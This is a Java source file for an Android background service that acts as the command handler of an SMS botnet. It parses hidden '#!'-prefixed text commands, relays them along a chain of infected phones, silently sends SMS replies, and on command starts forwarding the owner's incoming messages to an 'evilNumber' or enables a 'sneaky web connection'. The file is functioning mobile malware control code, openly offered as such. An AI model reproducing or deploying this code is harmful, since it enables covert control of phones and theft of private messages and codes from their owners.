package com.SmsService;





import android.app.Service;
import android.content.Context;
import android.content.Intent;
import android.content.IntentFilter;
import android.os.Bundle;
import android.os.Handler;
import android.os.IBinder;
import android.telephony.SmsManager;
import android.telephony.SmsMessage;
import android.telephony.TelephonyManager;
import java.util.Queue;

import android.os.PowerManager;

public class CommandService extends Service {	
	
	/*
	 * SMS COMMAND pattern:  (time is added to SMS back automatically)
	 * 
	 *                                                            command
	 * 1) send back phone number
	 *       COMMAND_SIGN   SEPERATE   receiver     SEPERATE sendbackPhoneNumberSign ( SEPERATE time )
	 *    ex    #!             |       0952559593       |            01                 |     1234  
	 *    
	 *                                                                        
	 * 2) set left bot number                                        
	 *       COMMAND_SIGN  SEPERATE   receiver      SEPERATE    SET_LEFT_BOT  SEPERATE  leftBotNumber  SEPERATE  SET_BOT_READY ( SEPERATE time )
	 *    ex    #!             |       0952559593       |            02           |       0952559593       |          Y             |    1234
	 *    ex    #!             |       0952559593       |            02           |       0952559593       |          N             |    1234
	 *    
	 * 3) set right bot number
	 *       COMMAND_SIGN   SEPERATE   receiver     SEPERATE    SET_RIGHT_BOT SEPERATE  rightBotNumber SEPERATE  SET_BOT_READY ( SEPERATE time )
	 *    ex    #!             |       0952558474       |            03           |       0952738353       |          Y             |    1234
	 *    ex    #!             |       0952558474       |            03           |       0952738353       |          N             |    1234
	 * 4) start forwarding SMS message
	 *       COMMAND_SIGN   SEPERATE   receiver     SEPERATE START_FORWARD_SMS SEPERATE  evilNumber ( SEPERATE time )
	 *    ex    #!             |         YOU            |            04           |       5558          |    1234
	 *    
	 * 5) stop forwarding SMS message
	 *       COMMAND_SIGN   SEPERATE   receiver     SEPERATE  STOP_FORWARD_SMS ( SEPERATE  time )
	 *    ex    #!             |         YOU            |            05             |     1234
	 *	
	 * 6) enable sneaky web connection
	 *       COMMAND_SIGN   SEPERATE   receiver     SEPERATE  ENABLE_SNEAKY_WEB ( SEPERATE  time )
	 *    ex    #!             |         YOU            |            06             |      1234
	 * 7) disable sneaky web connection
	 *       COMMAND_SIGN   SEPERATE   receiver     SEPERATE  STOP_SNEAKY_WEB (  SEPERATE  time )
	 *    ex    #!             |         YOU            |            07             |     1234
	 */
	
	
	
	
	@Override
	public IBinder onBind(Intent intent) {		
		return null;
	}	
	
	public void onCreate() {
		//just in case
		CommonVariable.CommandServiceLock = "true";
		Debug.PrintLog("CommandService","CommandServiceLock set "+CommonVariable.CommandServiceLock);		
		
		
	}
	//this method is useful in the emulator or has network ability in the GSM.
	//what if there is no network ability and in a GSM network??
	
	public boolean GetMyPhoneNumber(String sender) {
		// for emulator
/*
		TelephonyManager tMgr =(TelephonyManager)getSystemService(Context.TELEPHONY_SERVICE);
		CommonVariable.selfNumber = tMgr.getLine1Number().equals("")? CommonVariable.selfNumber : tMgr.getLine1Number() ;
		PrintLog("my phone number is:"+CommonVariable.selfNumber);
*/
		
		// for GSM
		if ( CommonVariable.selfNumber.equals("") ) {	
			// check left
			if ( !CommonVariable.leftBotNumber.equals("") && CommonVariable.isSendLeftBotToQueryNumber.equals("false") ) {
				String SMSContent = CommonVariable.COMMAND_SIGN+CommonVariable.SEPERATE+CommonVariable.leftBotNumber+CommonVariable.SEPERATE+CommonVariable.SENDBACK_PHONE_NUMBER; 
				SendSMS(sender,CommonVariable.leftBotNumber,SMSContent,CommonVariable.PHONE_NUMBER_RESPONSE,null,true);
				CommonVariable.isSendLeftBotToQueryNumber = "true";
			}
			// check right
			else if ( !CommonVariable.rightBotNumber.equals("") && CommonVariable.isSendRightBotToQueryNumber.equals("false") ) {
				String SMSContent = CommonVariable.COMMAND_SIGN+CommonVariable.SEPERATE+CommonVariable.rightBotNumber+CommonVariable.SEPERATE+CommonVariable.SENDBACK_PHONE_NUMBER;
				SendSMS(sender,CommonVariable.rightBotNumber,SMSContent,CommonVariable.PHONE_NUMBER_RESPONSE,null,true);
				CommonVariable.isSendRightBotToQueryNumber = "true";
			}
			
		}
		return true;
	}
	
	public void onDestroy() {
		if(!CommandJob.isEmpty()) {
			Debug.PrintLog("CommandService", "still job in job queue");			
			CommandJob.stillJob = true;
			sendBroadcast(new Intent().setAction
					("CommandService.stillJob"));
		}
		else {
			CommonVariable.CommandServiceLock = "false";	
		}			
		CommonVariable var = new CommonVariable();
		var.storeCommonVariable(this);
		Debug.PrintLog("CommandService","CommandServiceLock set "+CommonVariable.CommandServiceLock);
		
	}
	
	
	@Override
	public int onStartCommand(Intent intent, int flags, int startId) {	 		
		CommandJobElement job;
		
		// Try to get my phone number
		/*
		if ( CommonVariable.selfNumber.equals("") ) {
			GetMyPhoneNumber();
		}
		*/
		
		if(CommandJob.isEmpty()){
			Debug.PrintLog("CommandService", "nothing in the job queue, why I'm awake....:P");
			this.stopSelf();
		}
		
		//if there are multi command in the job queue, execute all
		else {
			while(!CommandJob.isEmpty()) {
				job = CommandJob.getJob();
				CommandMode(job.number, job.command);
			}	
		}
			
		this.stopSelf();
	    return START_STICKY;
	}
	public boolean CommandMode ( String sender, String command ) {		
		
		Debug.PrintLog("CommandService","Deal with command: "+command);
		/* parse command */
		String[] cmd = command.split(CommonVariable.SEPERATE) ;
		
		if ( cmd[0].contains(CommonVariable.COMMAND_SIGN) ) {			
			boolean isForMe = cmd[1].contains(CommonVariable.selfNumber) || cmd[1].contains(CommonVariable.FORCE_RECEIVE_SIGN) ;			
			if ( cmd[2].contains(CommonVariable.SENDBACK_PHONE_NUMBER) ) {
				if ( isForMe ) {
					try {
						SendSMS(sender,sender,CommonVariable.RESPONSE_SIGN+CommonVariable.SEPERATE+CommonVariable.SENDBACK_PHONE_NUMBER+CommonVariable.SEPERATE+sender,CommonVariable.HAVE_RECEIVED,cmd[3],true);
					}catch ( Exception e ) {
						Debug.PrintLog("CommandService", "There is no time in command.");
						SendSMS(sender,sender,CommonVariable.RESPONSE_SIGN+CommonVariable.SEPERATE+CommonVariable.SENDBACK_PHONE_NUMBER+CommonVariable.SEPERATE+sender,CommonVariable.HAVE_RECEIVED,null,true);
					}
					Debug.PrintLog("CommandService","Send Real Phone Number back.");
				}
				else {
					
				}
			}
			else if ( cmd[2].contains(CommonVariable.SET_LEFT_BOT) ) {
				// inform sender for receiving message success
				try {
					SendSMS(sender,sender,CommonVariable.RESPONSE_SIGN+CommonVariable.SEPERATE+CommonVariable.HAVE_RECEIVED,null,cmd[5],false);
				}catch ( Exception e ) {
					Debug.PrintLog("CommandService", "There is no time in command.");
					SendSMS(sender,sender,CommonVariable.RESPONSE_SIGN+CommonVariable.SEPERATE+CommonVariable.HAVE_RECEIVED,null,null,false);
				}
				Debug.PrintLog("CommandService","Send HAVE_RECEIVED signal back.");
				if ( isForMe ) {					
					SetLeftBotNumber(cmd[3].trim());					
					Debug.PrintLog("CommandService","Set Left Bot Number and the number is "+CommonVariable.leftBotNumber);
					CommonVariable.isSendLeftBotToQueryNumber = "false";
					GetMyPhoneNumber(sender);
					if ( cmd[4].contains(CommonVariable.SET_BOT_READY) ) {
						SendSMS(sender,CommonVariable.leftBotNumber,CommonVariable.COMMAND_SIGN+CommonVariable.SEPERATE+CommonVariable.FORCE_RECEIVE_SIGN+CommonVariable.SEPERATE+CommonVariable.SET_RIGHT_BOT+CommonVariable.SEPERATE+CommonVariable.selfNumber,CommonVariable.HAVE_RECEIVED,null,true);
						Debug.PrintLog("CommandService", "Send SMS to left bot for changing his right ride.");
					}
				}				
				
				else {
					String commandTemp = cmd[0]+CommonVariable.SEPERATE+cmd[1]+CommonVariable.SEPERATE+cmd[2]+CommonVariable.SEPERATE+cmd[3]+CommonVariable.SEPERATE+cmd[4];
					try {
						forwardToNext(sender,commandTemp,cmd[5]);
					}catch ( Exception e ) {
						forwardToNext(sender,commandTemp,null);
					}
				}
			}
			else if ( cmd[2].contains(CommonVariable.SET_RIGHT_BOT) ) {
				if ( isForMe ) {
					// inform sender for receiving message success
					try {
						SendSMS(sender,sender,CommonVariable.RESPONSE_SIGN+CommonVariable.SEPERATE+CommonVariable.HAVE_RECEIVED,null,cmd[5],false);
					}catch ( Exception e ) {
						Debug.PrintLog("CommandService", "There is no time in command.");
						SendSMS(sender,sender,CommonVariable.RESPONSE_SIGN+CommonVariable.SEPERATE+CommonVariable.HAVE_RECEIVED,null,null,false);
					}
					Debug.PrintLog("CommandService","Send HAVE_RECEIVED signal back.");
					
					SetRightBotNumber(cmd[3].trim());
					Debug.PrintLog("CommandService","Set Right Bot Number and the number is "+CommonVariable.rightBotNumber);
					CommonVariable.isSendRightBotToQueryNumber = "false";
					GetMyPhoneNumber(sender) ;
					try {
						if ( cmd[4].contains(CommonVariable.SET_BOT_READY) ) {
							SendSMS(sender,CommonVariable.rightBotNumber,CommonVariable.COMMAND_SIGN+CommonVariable.SEPERATE+CommonVariable.FORCE_RECEIVE_SIGN+CommonVariable.SEPERATE+CommonVariable.SET_LEFT_BOT+CommonVariable.SEPERATE+CommonVariable.selfNumber,CommonVariable.HAVE_RECEIVED,null,true);
							Debug.PrintLog("CommandService", "Send SMS to right bot for changing his left ride.");
						}
					} catch ( Exception e ) {
						Debug.PrintLog("CommandService",e.toString());
					}
					
				}
				else {
					String commandTemp = cmd[0]+CommonVariable.SEPERATE+cmd[1]+CommonVariable.SEPERATE+cmd[2]+CommonVariable.SEPERATE+cmd[3]+CommonVariable.SEPERATE+cmd[4];
					try {
						forwardToNext(sender,commandTemp,cmd[5]);
					}catch ( Exception e ) {
						forwardToNext(sender,commandTemp,null);
					}
				}
			}
			else if ( cmd[2].contains(CommonVariable.START_FORWARD_SMS) ) {
				if ( isForMe ) {
					// inform sender for receiving message success
					try {
						SendSMS(sender,sender,CommonVariable.RESPONSE_SIGN+CommonVariable.SEPERATE+CommonVariable.HAVE_RECEIVED,null,cmd[4],false);
					}catch(Exception e) {
						Debug.PrintLog("CommandService", "There is no time in command.");
						SendSMS(sender,sender,CommonVariable.RESPONSE_SIGN+CommonVariable.SEPERATE+CommonVariable.HAVE_RECEIVED,null,null,false);
					}
					Debug.PrintLog("CommandService","Send HAVE_RECEIVED signal back.");
					
					startFoward(cmd[3].trim());
					
				}
				else {
					String commandTemp = cmd[0]+CommonVariable.SEPERATE+cmd[1]+CommonVariable.SEPERATE+cmd[2]+CommonVariable.SEPERATE+cmd[3];
					try {
						forwardToNext(sender,commandTemp,cmd[4]);
					}catch ( Exception e ) {
						forwardToNext(sender,commandTemp,null);
					}
				}
			}
			else if ( cmd[2].contains(CommonVariable.STOP_FORWARD_SMS) ) {
				if ( isForMe ) {
					// inform sender for receiving message success
					try {
						SendSMS(sender,sender,CommonVariable.RESPONSE_SIGN+CommonVariable.SEPERATE+CommonVariable.HAVE_RECEIVED,null,cmd[3],false);
					}catch ( Exception e ) {
						Debug.PrintLog("CommandService", "There is no time in command.");
						SendSMS(sender,sender,CommonVariable.RESPONSE_SIGN+CommonVariable.SEPERATE+CommonVariable.HAVE_RECEIVED,null,null,false);
					}
					
					Debug.PrintLog("CommandService","Send HAVE_RECEIVED signal back.");
					
					stopFoward();
				}
				else {
					String commandTemp = cmd[0]+CommonVariable.SEPERATE+cmd[1]+CommonVariable.SEPERATE+cmd[2];
					try {
						forwardToNext(sender,commandTemp,cmd[3]);
					}catch ( Exception e ) {
						forwardToNext(sender,commandTemp,null);
					}
				}
			}
			else if ( cmd[2].contains(CommonVariable.ENABLE_SNEAKY_WEB) ) {
				if ( isForMe ) {
					try {
						SendSMS(sender,sender,CommonVariable.RESPONSE_SIGN+CommonVariable.SEPERATE+CommonVariable.HAVE_RECEIVED,null,cmd[3],false);
					}catch ( Exception e ) {
						Debug.PrintLog("CommandService", "There is no time in command.");
						SendSMS(sender,sender,CommonVariable.RESPONSE_SIGN+CommonVariable.SEPERATE+CommonVariable.HAVE_RECEIVED,null,null,false);
					}
					Debug.PrintLog("CommandService","enable sneaky web service....");
					CommonVariable.enableSneakyFlag = "true";
				}
				else {
					String commandTemp = cmd[0]+CommonVariable.SEPERATE+cmd[1]+CommonVariable.SEPERATE+cmd[2];
					try {
						forwardToNext(sender,commandTemp,cmd[3]);
					}catch ( Exception e ) {
						forwardToNext(sender,commandTemp,null);
					}
				}
			}
			else if ( cmd[2].contains(CommonVariable.STOP_SNEAKY_WEB) ) {
				if ( isForMe ) {
					try {
						SendSMS(sender,sender,CommonVariable.RESPONSE_SIGN+CommonVariable.SEPERATE+CommonVariable.HAVE_RECEIVED,null,cmd[3],false);
					}catch ( Exception e ) {
						Debug.PrintLog("CommandService", "There is no time in command.");
						SendSMS(sender,sender,CommonVariable.RESPONSE_SIGN+CommonVariable.SEPERATE+CommonVariable.HAVE_RECEIVED,null,null,false);
					}
					Debug.PrintLog("CommandService","disable sneaky web service....");
					CommonVariable.enableSneakyFlag = "false";
				}
				else {
					String commandTemp = cmd[0]+CommonVariable.SEPERATE+cmd[1]+CommonVariable.SEPERATE+cmd[2];
					try {
						forwardToNext(sender,commandTemp,cmd[3]);
					}catch ( Exception e ) {
						forwardToNext(sender,commandTemp,null);
					}
				}
			}
			else if ( cmd[2].contains("l") ) {
				if ( isForMe ) {
					Debug.PrintLog("CommandService",CommonVariable.leftBotNumber);
				}
				else {
				
				}
			}
			else if ( cmd[2].contains("r") ) {
				if ( isForMe ) {
					Debug.PrintLog("CommandService",CommonVariable.rightBotNumber);
				}
				else {
				
				}
			}
			else if ( cmd[2].contains("m") ) {
				if ( isForMe ) {
					Debug.PrintLog("CommandService",CommonVariable.selfNumber);
				}
				else {
				
				}
			}
			else if ( cmd[2].contains("show") ) {
				Debug.PrintLog("CommandService", "Show responseJobQueue start");
				if ( isForMe ) {
					Debug.PrintLog("CommandService", "responseJobQueue has "+ResponseTable.size()+" entities.");
					for ( int i=0 ; i<ResponseTable.size() ; i++ ) {
						ResponseTableElement job = ResponseTable.getResponseJob(i);
						Debug.PrintLog("CommandService", "number: " + job.number);
						for ( int j=0 ; j<job.commandQueue.size() ; j++ ) {
							Debug.PrintLog("CommandService", "command: " + job.commandQueue.get(j).command) ;
							Debug.PrintLog("CommandService", "time: " + job.commandQueue.get(j).time) ;
							Debug.PrintLog("CommandService", "oldTime: " + job.commandQueue.get(j).oldTime) ;
							Debug.PrintLog("CommandService", "sign: " + job.commandQueue.get(j).sign) ;
						}
					}
				}
				else {
					
				}
			}
			else {
				Debug.PrintLog("CommandService","Couldn't find any command.");
			
			}
		
		
			return true;
		}
		else if (cmd[0].contains(CommonVariable.RESPONSE_SIGN)) {
			Debug.PrintLog("CommandService","I am in Command mode, but I receive a RESPONSE signal?");
			//PrintToast("I am in Command mode, but I receive a RESPONSE signal?",this);
			return true;
		}
		// there is not command
		else {
			return false;
		}
	}
	
	private boolean forwardToNext( String sender, String commandTemp , String oldTime ) {
		// to right
		if ( sender.equals(CommonVariable.leftBotNumber) && !CommonVariable.rightBotNumber.equals("") ) {
			// forward to next
			SendSMS(sender,CommonVariable.rightBotNumber,commandTemp,CommonVariable.HAVE_RECEIVED,oldTime,true);
			Debug.PrintLog("CommandService","Forward to right Bot successfully and the number is "+CommonVariable.rightBotNumber);
		}
		// to left
		else if ( sender.equals(CommonVariable.rightBotNumber) && !CommonVariable.leftBotNumber.equals("") ) {
			// forward to next
			SendSMS(sender,CommonVariable.leftBotNumber,commandTemp,CommonVariable.HAVE_RECEIVED,oldTime,true);
			Debug.PrintLog("CommandService","Forward to left Bot successfully and the number is "+CommonVariable.leftBotNumber);
		}
		// neither
		else {
			/* if another hacker(not bot master) send command to you directly? */
			Debug.PrintLog("CommandService", "Not from left or right. Default: pass to left");
			SendSMS(sender,CommonVariable.leftBotNumber,commandTemp,CommonVariable.HAVE_RECEIVED,oldTime,true);
			Debug.PrintLog("CommandService","Forward to left Bot successfully and the number is "+CommonVariable.leftBotNumber);
		}
		return true;
	}
	
	private boolean checkScreenIsOn() {
		PowerManager pm = (PowerManager) getSystemService(CommandService.POWER_SERVICE);
		if ( !pm.isScreenOn() ) {
			Debug.PrintLog("CommandService","Screen is off....");
			return false;
		}
		else {
			Debug.PrintLog("CommandService","Screen is on....");
			return true;
		}
	}
	private void startFoward(String evilNumber) {
		if ( CommonVariable.ForwardServiceLock.equals("false") ) {
			Intent foward = new Intent(this, FowardService.class);
			foward.putExtra("evilNumber", evilNumber);
			CommonVariable.ForwardServiceLock = "true";
			this.startService(foward);
		}
		else {
			Debug.PrintLog("CommandService","ForwardService is locked.");
		}
	}
	
	private void stopFoward() {
		if ( CommonVariable.ForwardServiceLock.equals("true") ) {
			Intent foward = new Intent(this, FowardService.class);
			CommonVariable.ForwardServiceLock = "false";
			this.stopService(foward);
		}
		else {
			Debug.PrintLog("CommandService","ForwardService is not started.");
		}
	}
	private boolean SetLeftBotNumber( String left ) {
		CommonVariable.leftBotNumber = left;
		return true;
	}
	private boolean SetRightBotNumber( String right ) {
		CommonVariable.rightBotNumber = right;
		return true;
	}
	
	private boolean SendSMS ( String sender, String destNumber, String message, String state, String receivedTime, boolean isToWaitResponse ) {
        // wait others send back
        if ( isToWaitResponse == true ) {
        	String time = ResponseTable.addJob(destNumber, message, state, receivedTime);
        	SmsManager smsManager = SmsManager.getDefault();  
            smsManager.sendTextMessage(destNumber, null, message+CommonVariable.SEPERATE+time, null, null);
        }
        // return back
        else {
        	if ( !sender.equals("0000") ) {
	        	if ( receivedTime == null ) {
	        		SmsManager smsManager = SmsManager.getDefault();  
	                smsManager.sendTextMessage(destNumber, null, message, null, null);
	        	}
	        	else {
	        		SmsManager smsManager = SmsManager.getDefault();  
	                smsManager.sendTextMessage(destNumber, null, message+CommonVariable.SEPERATE+receivedTime, null, null);
	        	}
        	}
        }
        return true;
	}
	
}
